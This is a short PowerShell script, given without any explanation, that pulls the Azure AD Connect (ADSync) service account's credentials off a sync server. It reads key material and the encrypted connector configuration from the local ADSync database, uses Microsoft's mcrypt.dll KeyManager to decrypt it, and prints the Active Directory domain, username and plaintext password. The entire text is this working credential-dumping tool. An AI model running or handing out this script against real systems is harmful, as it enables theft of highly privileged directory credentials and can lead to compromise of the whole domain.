$query1 = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost

$query2 = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost

Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

$km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($query1.entropy,$query1.instance_id,$query1.keyset_id);
$key1 = $null; $km.GetActiveCredentialKey([ref]$key1)
$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($query2.encrypted_configuration,[ref]$decrypted)

(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}).Domain
(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}).Username
(select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}).Password
